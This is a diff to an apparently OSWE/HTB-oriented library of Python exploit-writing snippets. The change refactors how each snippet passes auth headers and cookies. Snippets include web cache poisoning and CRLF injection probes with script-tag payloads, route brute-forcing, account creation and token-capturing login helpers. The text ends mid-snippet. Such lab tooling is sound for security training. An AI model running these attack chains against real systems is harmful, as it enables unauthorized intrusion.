@@ -231,7 +231,7 @@ var PIECES = [
     defaultFunction:"",
     aliases:["main.py","exploit.py","requests session","burp proxy","debug","config"],
     useWhen:"Copy first. Proxy is off by default; enable Burp with --proxy and verbose output with --debug.",
-    editFirst:["TARGET","USERNAME","PASSWORD","VERIFY_TLS","TIMEOUT"],
+    editFirst:["TARGET","USERNAME","PASSWORD","HEADERS","COOKIES","SESSION_COOKIES","VERIFY_TLS","TIMEOUT"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`#!/usr/bin/env python3
@@ -255,6 +255,9 @@ PROXY = None                     # off by default; set only via --proxy
 DEBUG = False                    # set by --debug
 VERIFY_TLS = False               # override with --verify-tls
 TIMEOUT = 12                     # override with --timeout
+HEADERS = {}                     # EDIT explicit headers, e.g. {"Authorization": "Bearer REPLACE"}
+COOKIES = {}                     # EDIT explicit cookies, e.g. {"token": "REPLACE"}
+SESSION_COOKIES = True           # EDIT True keeps cookies learned by login()
 
 s = requests.Session()
 s.verify = VERIFY_TLS
@@ -309,6 +312,30 @@ def require_callback():
 def callback_url(path="", scheme="http"):
     require_callback()
     return f"{scheme}://{LHOST}:{LPORT}/{path.lstrip('/')}"
+
+def send_request(method, path, *, params=None, data=None, json_body=None, headers=None, cookies=None,
+                 session_cookies=None, timeout=None, allow_redirects=True, files=None):
+    # Auth is explicit: set HEADERS/COOKIES. SESSION_COOKIES only reuses cookies learned by login().
+    if session_cookies is None:
+        session_cookies = SESSION_COOKIES
+    request_headers = dict(headers or {})
+    request_cookies = {}
+    if session_cookies:
+        request_cookies.update(s.cookies.get_dict())
+    request_cookies.update(cookies or {})
+    request_body = {}
+    if json_body is not None:
+        request_body["json"] = json_body
+
+    req = requests.Session()
+    req.verify = VERIFY_TLS
+    req.proxies.update(s.proxies)
+    r = req.request(method, url(path), params=params, data=data, headers=request_headers,
+                    cookies=request_cookies, timeout=timeout or TIMEOUT,
+                    allow_redirects=allow_redirects, files=files, **request_body)
+    if session_cookies:
+        s.cookies.update(req.cookies)
+    return r
 `
   },
   {
@@ -320,16 +347,24 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"send_raw_request",
     aliases:["burp","repeater","raw http","requests get","requests post","reissue request scripter"],
     useWhen:"Burp Repeater or Reissue Request Scripter already has the right request and you need a requests shape fast.",
-    editFirst:["METHOD","PATH","HEADERS","DATA"],
+    editFirst:["METHOD","PATH","HEADERS","COOKIES","SESSION_COOKIES","DATA"],
     dependsOn:[],
     sourceRefs:["rizemon/exploit-writing-for-oswe","Skeleton Scripts"],
     code:String.raw`def send_raw_request():
     METHOD = "POST"              # EDIT
     PATH = "/endpoint"           # EDIT
-    HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}  # EDIT
+    HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}  # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                 # EDIT exact request cookies, e.g. {"token": "REPLACE"}
+    SESSION_COOKIES = True       # EDIT True keeps s cookies from login; False = only COOKIES above
     DATA = "a=1&b=2"             # EDIT
 
-    r = s.request(METHOD, url(PATH), headers=HEADERS, data=DATA, timeout=TIMEOUT)
+    r = send_request(
+        METHOD, PATH,
+        headers=HEADERS,
+        cookies=COOKIES,
+        data=DATA,
+        session_cookies=SESSION_COOKIES,
+    )
     dprint(r.status_code, r.url)
     if DEBUG:
         print(r.text[:500])
@@ -346,7 +381,7 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"http_get_request",
     aliases:["get","request","specific get","params","headers","cookies","probe","endpoint","burp"],
     useWhen:"You need one explicit GET step in the exploit chain. Duplicate it and rename the function for multiple target-specific GETs.",
-    editFirst:["PATH","AUTH_MODE","AUTH_TOKEN_VALUE","HEADERS","COOKIES","EXPECT_STATUS","EXPECT_TEXT"],
+    editFirst:["PATH","HEADERS","COOKIES","SESSION_COOKIES","EXPECT_STATUS","EXPECT_TEXT"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def http_get_request():
@@ -354,40 +389,21 @@ def callback_url(path="", scheme="http"):
     # main.py use: duplicate this step and rename it for get_profile(), get_token(), etc.
     PATH = "/api/item"                  # EDIT
     PARAMS = {"id": "1"}                # EDIT query string params; {} if none
-    HEADERS = {}                        # EDIT custom per-request headers
-    COOKIES = {}                        # EDIT custom per-request cookies
-    AUTH_MODE = "none"                  # EDIT: none | session | bearer | cookie | custom
-    AUTH_TOKEN_VALUE = None             # EDIT None uses LOOT_HIT or AUTH_TOKEN; or set a string
-    BEARER_PREFIX = "Bearer"            # EDIT
-    COOKIE_NAME = "token"               # EDIT for AUTH_MODE=cookie
-    AUTH_HEADERS = {}                   # EDIT for AUTH_MODE=custom, e.g. {"X-Api-Key": LOOT_HIT}
+    HEADERS = {}                        # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                        # EDIT e.g. {"token": "REPLACE"}
+    SESSION_COOKIES = True              # EDIT True keeps s cookies from login; False = only COOKIES above
     EXPECT_STATUS = (200,)              # EDIT e.g. (200, 302)
     EXPECT_TEXT = ""                    # EDIT optional marker in response body
     FOLLOW_REDIRECTS = True             # EDIT
     PRINT_BODY = True                   # EDIT
 
-    headers = dict(HEADERS)
-    cookies = dict(COOKIES)
-    token_value = AUTH_TOKEN_VALUE if AUTH_TOKEN_VALUE is not None else (globals().get("LOOT_HIT") or globals().get("AUTH_TOKEN"))
-    check(AUTH_MODE in ("none", "session", "bearer", "cookie", "custom"), "bad AUTH_MODE")
-    if AUTH_MODE != "session":
-        s.headers.pop("Authorization", None)  # avoid stale Bearer from older steps
-    if AUTH_MODE == "bearer":
-        check(token_value, "AUTH_MODE=bearer needs AUTH_TOKEN_VALUE, LOOT_HIT, or AUTH_TOKEN")
-        headers["Authorization"] = f"{BEARER_PREFIX} {token_value}"
-    elif AUTH_MODE == "cookie":
-        check(token_value, "AUTH_MODE=cookie needs AUTH_TOKEN_VALUE, LOOT_HIT, or AUTH_TOKEN")
-        cookies[COOKIE_NAME] = token_value
-    elif AUTH_MODE == "custom":
-        headers.update(AUTH_HEADERS)
-
-    r = s.get(
-        url(PATH),
+    r = send_request(
+        "GET", PATH,
         params=PARAMS,
-        headers=headers,
-        cookies=cookies,
+        headers=HEADERS,
+        cookies=COOKIES,
+        session_cookies=SESSION_COOKIES,
         allow_redirects=FOLLOW_REDIRECTS,
-        timeout=TIMEOUT,
     )
     dprint("GET", r.url, r.status_code, "len=", len(r.text))
     check(r.status_code in EXPECT_STATUS, f"GET bad status {r.status_code}")
@@ -407,7 +423,7 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"conditional_get_extract",
     aliases:["get","conditional get","extract","regex","admin twice","contains","marker","filter","response parser","html json text"],
     useWhen:"GET response contains many repeated values and you need a simple body-check, regex extract, hit filter, and first/last/all selector.",
-    editFirst:["PATH","ITEM_REGEX","HIT_ALL","SELECT_HIT","DEDUPE","FIELD_REGEX","DEBUG"],
+    editFirst:["PATH","HEADERS","COOKIES","SESSION_COOKIES","ITEM_REGEX","HIT_ALL","SELECT_HIT","DEDUPE","FIELD_REGEX","DEBUG"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def conditional_get_extract():
@@ -428,8 +444,9 @@ def callback_url(path="", scheme="http"):
 
     PATH = "/api/items"                       # EDIT e.g. /group/13/messages
     PARAMS = {}                               # EDIT query params
-    HEADERS = {}                              # EDIT extra headers; Bearer from login is already in s.headers
-    COOKIES = {}                              # EDIT extra cookies
+    HEADERS = {}                              # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                              # EDIT e.g. {"token": "REPLACE"}
+    SESSION_COOKIES = True                    # EDIT True keeps s cookies from login; False = only COOKIES above
     EXPECT_STATUS = (200,)                    # EDIT
     FOLLOW_REDIRECTS = True                   # EDIT
 
@@ -456,13 +473,13 @@ def callback_url(path="", scheme="http"):
     FIELD_REGEX = r'([A-Za-z_][A-Za-z0-9_]*)=([^;"]+)'  # EDIT parse key=value from selected LOOT_HIT; "" disables
     DEBUG = True                              # EDIT print body preview, captures, skips, loot
 
-    r = s.get(
-        url(PATH),
+    r = send_request(
+        "GET", PATH,
         params=PARAMS,
         headers=HEADERS,
         cookies=COOKIES,
+        session_cookies=SESSION_COOKIES,
         allow_redirects=FOLLOW_REDIRECTS,
-        timeout=TIMEOUT,
     )
     body = r.text
     dprint("conditional GET", r.url, r.status_code, "len=", len(body))
@@ -547,7 +564,7 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"http_post_request",
     aliases:["post","request","specific post","form","json","raw body","headers","cookies","endpoint","burp"],
     useWhen:"You need one explicit POST step in the exploit chain. Supports form, JSON, or raw body.",
-    editFirst:["PATH","MODE","AUTH_MODE","AUTH_TOKEN_VALUE","PARAMS","FORM_DATA","JSON_BODY","RAW_BODY","HEADERS","EXPECT_STATUS","EXPECT_TEXT"],
+    editFirst:["PATH","MODE","PARAMS","FORM_DATA","JSON_BODY","RAW_BODY","HEADERS","COOKIES","SESSION_COOKIES","EXPECT_STATUS","EXPECT_TEXT"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def http_post_request():
@@ -559,49 +576,30 @@ def callback_url(path="", scheme="http"):
     FORM_DATA = {"name": "test"}        # EDIT for MODE=form
     JSON_BODY = {"name": "test"}        # EDIT for MODE=json
     RAW_BODY = "name=test"              # EDIT for MODE=raw
-    HEADERS = {}                        # EDIT custom per-request headers; Content-Type if MODE=raw
-    COOKIES = {}                        # EDIT custom per-request cookies
-    AUTH_MODE = "none"                  # EDIT: none | session | bearer | cookie | custom
-    AUTH_TOKEN_VALUE = None             # EDIT None uses LOOT_HIT or AUTH_TOKEN; or set a string
-    BEARER_PREFIX = "Bearer"            # EDIT
-    COOKIE_NAME = "token"               # EDIT for AUTH_MODE=cookie
-    AUTH_HEADERS = {}                   # EDIT for AUTH_MODE=custom, e.g. {"X-Api-Key": LOOT_HIT}
+    HEADERS = {}                        # EDIT e.g. {"Authorization": "Bearer REPLACE"}; Content-Type if MODE=raw
+    COOKIES = {}                        # EDIT e.g. {"token": "REPLACE"}
+    SESSION_COOKIES = True              # EDIT True keeps s cookies from login; False = only COOKIES above
     EXPECT_STATUS = (200, 201, 202, 302) # EDIT
     EXPECT_TEXT = ""                    # EDIT optional marker in response body
     FOLLOW_REDIRECTS = True             # EDIT
     PRINT_BODY = True                   # EDIT
 
     check(MODE in ("form", "json", "raw"), "bad MODE")
-    headers = dict(HEADERS)
-    cookies = dict(COOKIES)
-    token_value = AUTH_TOKEN_VALUE if AUTH_TOKEN_VALUE is not None else (globals().get("LOOT_HIT") or globals().get("AUTH_TOKEN"))
-    check(AUTH_MODE in ("none", "session", "bearer", "cookie", "custom"), "bad AUTH_MODE")
-    if AUTH_MODE != "session":
-        s.headers.pop("Authorization", None)  # avoid stale Bearer from older steps
-    if AUTH_MODE == "bearer":
-        check(token_value, "AUTH_MODE=bearer needs AUTH_TOKEN_VALUE, LOOT_HIT, or AUTH_TOKEN")
-        headers["Authorization"] = f"{BEARER_PREFIX} {token_value}"
-    elif AUTH_MODE == "cookie":
-        check(token_value, "AUTH_MODE=cookie needs AUTH_TOKEN_VALUE, LOOT_HIT, or AUTH_TOKEN")
-        cookies[COOKIE_NAME] = token_value
-    elif AUTH_MODE == "custom":
-        headers.update(AUTH_HEADERS)
-
     kwargs = {
         "params": PARAMS,
-        "headers": headers,
-        "cookies": cookies,
+        "headers": HEADERS,
+        "cookies": COOKIES,
+        "session_cookies": SESSION_COOKIES,
         "allow_redirects": FOLLOW_REDIRECTS,
-        "timeout": TIMEOUT,
     }
     if MODE == "form":
         kwargs["data"] = FORM_DATA
     elif MODE == "json":
-        kwargs["json"] = JSON_BODY
+        kwargs["json_body"] = JSON_BODY
     else:
         kwargs["data"] = RAW_BODY
 
-    r = s.post(url(PATH), **kwargs)
+    r = send_request("POST", PATH, **kwargs)
     dprint("POST", r.url, r.status_code, "len=", len(r.text))
     check(r.status_code in EXPECT_STATUS, f"POST bad status {r.status_code}")
     if EXPECT_TEXT:
@@ -620,7 +618,7 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"discover_route_action_matrix",
     aliases:["actionlist","wordlist","route discovery","routes_clean","endpoint discovery","controller action","get post put patch","status matrix","mvc"],
     useWhen:"You have controller/action wordlists and need to test /word/action with GET and POST, keeping only interesting status codes.",
-    editFirst:["ACTIONLIST","WORDLIST","BASE_PREFIX","METHODS","IGNORE_STATUS"],
+    editFirst:["ACTIONLIST","WORDLIST","BASE_PREFIX","METHODS","HEADERS","COOKIES","SESSION_COOKIES","IGNORE_STATUS"],
     dependsOn:[],
     sourceRefs:["user snippet"],
     code:String.raw`def discover_route_action_matrix():
@@ -632,7 +630,9 @@ def callback_url(path="", scheme="http"):
     METHODS = ["GET", "POST"]         # EDIT
     IGNORE_STATUS = {204, 401, 403, 404}  # EDIT boring statuses
     FOLLOW_REDIRECTS = False          # EDIT
-    EXTRA_HEADERS = {}                # EDIT auth/content-type if needed
+    HEADERS = {}                      # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                      # EDIT e.g. {"token": "REPLACE"}
+    SESSION_COOKIES = False           # EDIT True reuses cookies learned by login(); False = only COOKIES above
     POST_DATA = None                  # EDIT optional body for POST tests
 
     def load_lines(path, inline, name):
@@ -659,7 +659,14 @@ def callback_url(path="", scheme="http"):
             for method in METHODS:
                 try:
                     body = POST_DATA if method.upper() == "POST" else None
-                    r = s.request(method, url(path), headers=EXTRA_HEADERS, data=body, allow_redirects=FOLLOW_REDIRECTS, timeout=TIMEOUT)
+                    r = send_request(
+                        method, path,
+                        headers=HEADERS,
+                        cookies=COOKIES,
+                        data=body,
+                        session_cookies=SESSION_COOKIES,
+                        allow_redirects=FOLLOW_REDIRECTS,
+                    )
                     statuses[method] = r.status_code
                     if r.status_code not in IGNORE_STATUS:
                         interesting = True
@@ -687,7 +694,7 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"web_cache_poison_probe",
     aliases:["cache poisoning","unkeyed parameter","unkeyed header","fat get","x-cache","host header","htb"],
     useWhen:"Need to test if a parameter/header influences the response but is absent from the cache key, or if a fat GET body is parsed by the origin.",
-    editFirst:["PATH","BASE_PARAMS","TEST_PARAM","TEST_HEADER","PAYLOAD","CACHE_HEADERS"],
+    editFirst:["PATH","HEADERS","COOKIES","SESSION_COOKIES","BASE_PARAMS","TEST_PARAM","TEST_HEADER","PAYLOAD","CACHE_HEADERS"],
     dependsOn:[],
     sourceRefs:["HTB Senior Web module 6"],
     code:String.raw`def web_cache_poison_probe():
@@ -698,6 +705,9 @@ def callback_url(path="", scheme="http"):
     PAYLOAD = '"><script>alert(1)</scr' + 'ipt>'     # EDIT reflected payload/marker
     CACHE_HEADERS = ["X-Cache", "X-Cache-Status", "Age", "CF-Cache-Status"]  # EDIT
     FAT_GET_BODY = False                        # EDIT True to send TEST_PARAM in GET body
+    HEADERS = {}                                # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                # EDIT e.g. {"token": "REPLACE"}
+    SESSION_COOKIES = False                     # EDIT True reuses cookies learned by login(); False = only COOKIES above
 
     def show(label, r):
         cache = {h: r.headers.get(h) for h in CACHE_HEADERS if r.headers.get(h)}
@@ -707,12 +717,12 @@ def callback_url(path="", scheme="http"):
             print(r.text[:500])
 
     params = dict(BASE_PARAMS)
-    r1 = s.get(url(PATH), params=params, timeout=TIMEOUT)
+    r1 = send_request("GET", PATH, params=params, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     show("baseline-1", r1)
-    r2 = s.get(url(PATH), params=params, timeout=TIMEOUT)
+    r2 = send_request("GET", PATH, params=params, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     show("baseline-2", r2)
 
-    headers = {}
+    headers = dict(HEADERS)
     data = None
     if FAT_GET_BODY:
         data = {TEST_PARAM: PAYLOAD}
@@ -721,9 +731,9 @@ def callback_url(path="", scheme="http"):
     if TEST_HEADER:
         headers[TEST_HEADER] = PAYLOAD
 
-    r3 = s.request("GET", url(PATH), params=params, headers=headers, data=data, timeout=TIMEOUT)
+    r3 = send_request("GET", PATH, params=params, headers=headers, cookies=COOKIES, data=data, session_cookies=SESSION_COOKIES)
     show("poison-attempt", r3)
-    r4 = s.get(url(PATH), params=BASE_PARAMS, timeout=TIMEOUT)
+    r4 = send_request("GET", PATH, params=BASE_PARAMS, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     show("victim-key", r4)
     return r3, r4
 `
@@ -737,7 +747,7 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"crlf_response_splitting_probe",
     aliases:["crlf","response splitting","header injection","refresh header","location header","log poisoning","htb"],
     useWhen:"A parameter is copied into a response header, redirect, refresh header, or log line and may accept CRLF/newlines.",
-    editFirst:["PATH","PARAM","BASE_VALUE","MODE","BODY_PAYLOAD"],
+    editFirst:["PATH","PARAM","HEADERS","COOKIES","SESSION_COOKIES","BASE_VALUE","MODE","BODY_PAYLOAD"],
     dependsOn:[],
     sourceRefs:["HTB Senior Web module 7"],
     code:String.raw`def crlf_response_splitting_probe():
@@ -746,6 +756,9 @@ def callback_url(path="", scheme="http"):
     BASE_VALUE = "http://example.invalid"       # EDIT normal value
     MODE = "header"                             # EDIT: header | body
     BODY_PAYLOAD = "<html><script>alert(1)</scr" + "ipt></html>"  # EDIT
+    HEADERS = {}                                # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                # EDIT e.g. {"token": "REPLACE"}
+    SESSION_COOKIES = False                     # EDIT True reuses cookies learned by login(); False = only COOKIES above
 
     if MODE == "header":
         injected = BASE_VALUE + "\r\nX-OSWE-Probe: 1"
@@ -755,7 +768,13 @@ def callback_url(path="", scheme="http"):
         die("MODE must be header or body")
 
     raw_path = PATH + ("&" if "?" in PATH else "?") + PARAM + "=" + quote(injected, safe=":/?&=")
-    r = s.get(url(raw_path), allow_redirects=False, timeout=TIMEOUT)
+    r = send_request(
+        "GET", raw_path,
+        headers=HEADERS,
+        cookies=COOKIES,
+        session_cookies=SESSION_COOKIES,
+        allow_redirects=False,
+    )
     print("[crlf]", r.status_code)
     print("[headers]", dict(r.headers))
     print(r.text[:500])
@@ -773,7 +792,7 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"create_user",
     aliases:["create user","register","signup","sign up","account create","self registration","api user","user bootstrap","then login"],
     useWhen:"Registration or create-user endpoint lets you create a low-priv account, then reuse that account with any normal login piece.",
-    editFirst:["CREATE_PATH","MODE","USER_FIELD","PASS_FIELD","EMAIL_FIELD","EXTRA_DATA","SUCCESS_TEXT"],
+    editFirst:["CREATE_PATH","MODE","HEADERS","COOKIES","SESSION_COOKIES","USER_FIELD","PASS_FIELD","EMAIL_FIELD","EXTRA_DATA","SUCCESS_TEXT"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def create_user():
@@ -786,8 +805,11 @@ def callback_url(path="", scheme="http"):
     USER_FIELD = "username"                      # EDIT
     PASS_FIELD = "password"                      # EDIT
     EMAIL_FIELD = "email"                        # EDIT set "" if not needed
-    TOKEN_REGEX = r'name="csrf" value="([^"]+)"' # EDIT for csrf_* modes
-    TOKEN_FIELD = "csrf"                         # EDIT
+    CSRF_REGEX = r'name="csrf" value="([^"]+)"' # EDIT for csrf_* modes
+    CSRF_FIELD = "csrf"                         # EDIT
+    HEADERS = {}                                  # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                  # EDIT e.g. {"token": "REPLACE"}
+    SESSION_COOKIES = False                       # EDIT True reuses cookies learned by login(); False = only COOKIES above
     SUCCESS_TEXT = ""                            # EDIT optional marker; "" means status is enough
     SUCCESS_CODES = (200, 201, 202, 302)         # EDIT
     EXTRA_DATA = {}                              # EDIT e.g. {"role": "user", "confirm": PASSWORD}
@@ -814,17 +836,17 @@ def callback_url(path="", scheme="http"):
 
     if MODE.startswith("csrf_"):
         token_path = PRE_CREATE_PATH or CREATE_PATH
-        r = s.get(url(token_path), timeout=TIMEOUT)
-        m = re.search(TOKEN_REGEX, r.text)
+        r = send_request("GET", token_path, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
+        m = re.search(CSRF_REGEX, r.text)
         check(m, "CSRF token not found")
-        data[TOKEN_FIELD] = m.group(1)
+        data[CSRF_FIELD] = m.group(1)
     elif PRE_CREATE_PATH:
-        s.get(url(PRE_CREATE_PATH), timeout=TIMEOUT)
+        send_request("GET", PRE_CREATE_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
 
     if MODE.endswith("json"):
-        r = s.post(url(CREATE_PATH), json=data, allow_redirects=False, timeout=TIMEOUT)
+        r = send_request("POST", CREATE_PATH, headers=HEADERS, cookies=COOKIES, json_body=data, session_cookies=SESSION_COOKIES, allow_redirects=False)
     else:
-        r = s.post(url(CREATE_PATH), data=data, allow_redirects=False, timeout=TIMEOUT)
+        r = send_request("POST", CREATE_PATH, headers=HEADERS, cookies=COOKIES, data=data, session_cookies=SESSION_COOKIES, allow_redirects=False)
 
     dprint("create user status:", r.status_code, r.url)
     dprint("create user body:", r.text[:500])
@@ -847,7 +869,7 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"login_form_basic",
     aliases:["login","form","cookie","session","j_security_check","jsessionid","no csrf"],
     useWhen:"Normal username/password form login. USER_FIELD/PASS_FIELD are parameter names from Burp, not credential values.",
-    editFirst:["LOGIN_PATH","PRE_LOGIN_PATH","USER_FIELD","PASS_FIELD","SUCCESS_TEXT","EXTRA_DATA"],
+    editFirst:["LOGIN_PATH","PRE_LOGIN_PATH","HEADERS","COOKIES","SESSION_COOKIES","USER_FIELD","PASS_FIELD","SUCCESS_TEXT","EXTRA_DATA"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def login_form_basic():
@@ -857,9 +879,12 @@ def callback_url(path="", scheme="http"):
     PASS_FIELD = "password"          # EDIT field name from Burp body, not password value
     SUCCESS_TEXT = "Logout"          # EDIT; set "" if status/redirect is enough
     EXTRA_DATA = None                # EDIT dict only: {"p": "CRX", "s": "Standard"}
+    HEADERS = {}                     # EDIT e.g. {"Authorization": "Basic BASE64_USER_COLON_PASS"}
+    COOKIES = {}                     # EDIT e.g. {"JSESSIONID": "REPLACE"}
+    SESSION_COOKIES = True           # EDIT True keeps s cookies learned during login
 
     if PRE_LOGIN_PATH:
-        s.get(url(PRE_LOGIN_PATH), timeout=TIMEOUT)
+        send_request("GET", PRE_LOGIN_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
 
     check(EXTRA_DATA is None or isinstance(EXTRA_DATA, dict), "EXTRA_DATA must be None or a dict like {'x': 'y'}")
     check(USER_FIELD != PASS_FIELD, "USER_FIELD/PASS_FIELD must be field names, not credential values")
@@ -868,7 +893,7 @@ def callback_url(path="", scheme="http"):
     data[PASS_FIELD] = PASSWORD
     dprint("login data:", data)
 
-    r = s.post(url(LOGIN_PATH), data=data, allow_redirects=True, timeout=TIMEOUT)
+    r = send_request("POST", LOGIN_PATH, data=data, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, allow_redirects=True)
     dprint("login status:", r.status_code, r.url)
     check((not SUCCESS_TEXT) or SUCCESS_TEXT in r.text or r.status_code in (200, 302), "login failed")
     print("[+] logged in with form")
@@ -885,7 +910,7 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"login_form_csrf",
     aliases:["login","csrf","form","cookie","session","hidden field"],
     useWhen:"Login form needs a CSRF token or hidden field before posting credentials.",
-    editFirst:["LOGIN_PATH","TOKEN_REGEX","TOKEN_FIELD","USER_FIELD","PASS_FIELD","SUCCESS_TEXT"],
+    editFirst:["LOGIN_PATH","HEADERS","COOKIES","SESSION_COOKIES","TOKEN_REGEX","TOKEN_FIELD","USER_FIELD","PASS_FIELD","SUCCESS_TEXT"],
     dependsOn:[],
     sourceRefs:["Skeleton Scripts"],
     code:String.raw`def login_form_csrf():
@@ -895,8 +920,11 @@ def callback_url(path="", scheme="http"):
     USER_FIELD = "username"                       # EDIT
     PASS_FIELD = "password"                       # EDIT
     SUCCESS_TEXT = "Logout"                       # EDIT
+    HEADERS = {}                                  # EDIT e.g. {"Authorization": "Basic BASE64_USER_COLON_PASS"}
+    COOKIES = {}                                  # EDIT e.g. {"JSESSIONID": "REPLACE"}
+    SESSION_COOKIES = True                        # EDIT True keeps s cookies learned during login
 
-    r = s.get(url(LOGIN_PATH), timeout=TIMEOUT)
+    r = send_request("GET", LOGIN_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     m = re.search(TOKEN_REGEX, r.text)
     check(m, "CSRF token not found")
 
@@ -905,7 +933,7 @@ def callback_url(path="", scheme="http"):
         PASS_FIELD: PASSWORD,
         TOKEN_FIELD: m.group(1),
     }
-    r = s.post(url(LOGIN_PATH), data=data, timeout=TIMEOUT)
+    r = send_request("POST", LOGIN_PATH, data=data, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(SUCCESS_TEXT in r.text or r.status_code in (200, 302), "login failed")
     print("[+] logged in with form csrf")
     dprint("cookies:", s.cookies.get_dict())
@@ -920,40 +948,34 @@ def callback_url(path="", scheme="http"):
     chainRole:"auth",
     defaultFunction:"login_json_bearer",
     aliases:["login","json","bearer","api token","authorization"],
-    useWhen:"API login returns a token. Stores it as AUTH_TOKEN; install it into session only if you explicitly choose that.",
-    editFirst:["LOGIN_PATH","REQUEST_MODE","TOKEN_KEY","INSTALL_SESSION_AUTH","SUCCESS_CODES"],
+    useWhen:"API login returns a bearer-style token. Builds explicit HEADERS for later requests; copy/pass returned HEADERS where needed.",
+    editFirst:["LOGIN_PATH","REQUEST_MODE","RESPONSE_KEY","HEADER_SCHEME","HEADERS","COOKIES","SESSION_COOKIES","SUCCESS_CODES"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def login_json_bearer():
-    # Stores token globally. Does not force future requests to use it unless INSTALL_SESSION_AUTH=True.
-    # Later GET/POST snippets can use AUTH_MODE=bearer/cookie and AUTH_TOKEN_VALUE=None to reuse AUTH_TOKEN.
-    global AUTH_TOKEN, token
     LOGIN_PATH = "/api/login"          # EDIT
     REQUEST_MODE = "json"              # EDIT: json | form
-    TOKEN_KEY = "token"                # EDIT e.g. token/access_token/jwt
-    TOKEN_PREFIX = "Bearer"            # EDIT
-    INSTALL_SESSION_AUTH = False       # EDIT True only if all future s requests should use this token
+    RESPONSE_KEY = "token"             # EDIT e.g. token/access_token/jwt
+    HEADER_SCHEME = "Bearer"           # EDIT Authorization scheme
+    HEADERS = {}                       # EDIT login request headers; later replaced with Authorization header
+    COOKIES = {}                       # EDIT login request cookies if needed
+    SESSION_COOKIES = False            # EDIT True reuses cookies learned by previous steps
     SUCCESS_CODES = (200, 201)         # EDIT
 
-    s.headers.pop("Authorization", None)  # clear stale token from previous steps/runs in this session
     body = {"username": USERNAME, "password": PASSWORD}
     if REQUEST_MODE == "json":
-        r = s.post(url(LOGIN_PATH), json=body, timeout=TIMEOUT)
+        r = send_request("POST", LOGIN_PATH, json_body=body, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     elif REQUEST_MODE == "form":
-        r = s.post(url(LOGIN_PATH), data=body, timeout=TIMEOUT)
+        r = send_request("POST", LOGIN_PATH, data=body, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     else:
         die("bad REQUEST_MODE")
     check(r.status_code in SUCCESS_CODES, f"bad login status {r.status_code}")
 
-    AUTH_TOKEN = r.json().get(TOKEN_KEY)
-    check(AUTH_TOKEN, "token missing in login response")
-    token = AUTH_TOKEN  # compatibility with older snippets that use variable named token
-    if INSTALL_SESSION_AUTH:
-        s.headers.update({"Authorization": f"{TOKEN_PREFIX} {AUTH_TOKEN}"})
-        print("[+] bearer token installed in session headers")
-    else:
-        print("[+] bearer token stored as AUTH_TOKEN")
-    return AUTH_TOKEN
+    secret = r.json().get(RESPONSE_KEY)
+    check(secret, "token missing in login response")
+    HEADERS = {"Authorization": f"{HEADER_SCHEME} {secret}"}
+    print("[+] bearer HEADERS ready; pass them to send_request(..., headers=HEADERS)")
+    return HEADERS
 `
   },
   {
@@ -964,42 +986,44 @@ def callback_url(path="", scheme="http"):
     chainRole:"auth",
     defaultFunction:"login_basic_cookie_static",
     aliases:["basic auth","authorization basic","static cookie","jsessionid","cookie header","manual cookie","api key header"],
-    useWhen:"Endpoint does not use a form login: it needs HTTP Basic auth, a copied Cookie header, or a static Authorization/API header.",
-    editFirst:["AUTH_MODE","COOKIE_HEADER","HEADER_NAME","HEADER_VALUE","CHECK_PATH","SUCCESS_TEXT"],
+    useWhen:"Endpoint does not use a form login: it needs explicit static headers, HTTP Basic Authorization, or copied cookies.",
+    editFirst:["HEADERS","COOKIES","COOKIE_HEADER","SESSION_COOKIES","CHECK_PATH","SUCCESS_TEXT"],
     dependsOn:[],
     sourceRefs:["OSWE ch07 pattern","v4"],
     code:String.raw`def login_basic_cookie_static():
-    AUTH_MODE = "basic"                    # EDIT: basic/cookie/header/none
     CHECK_PATH = "/"                       # EDIT endpoint that proves auth
     SUCCESS_TEXT = ""                      # EDIT optional marker; "" means status is enough
-    COOKIE_HEADER = "JSESSIONID=REPLACE"   # EDIT if AUTH_MODE=cookie, paste Burp Cookie header value
-    HEADER_NAME = "Authorization"          # EDIT if AUTH_MODE=header
-    HEADER_VALUE = "Bearer REPLACE"        # EDIT if AUTH_MODE=header
+    SESSION_COOKIES = False                # EDIT True also stores COOKIES in s for later session-cookie reuse
+    HEADERS = {                            # EDIT static headers
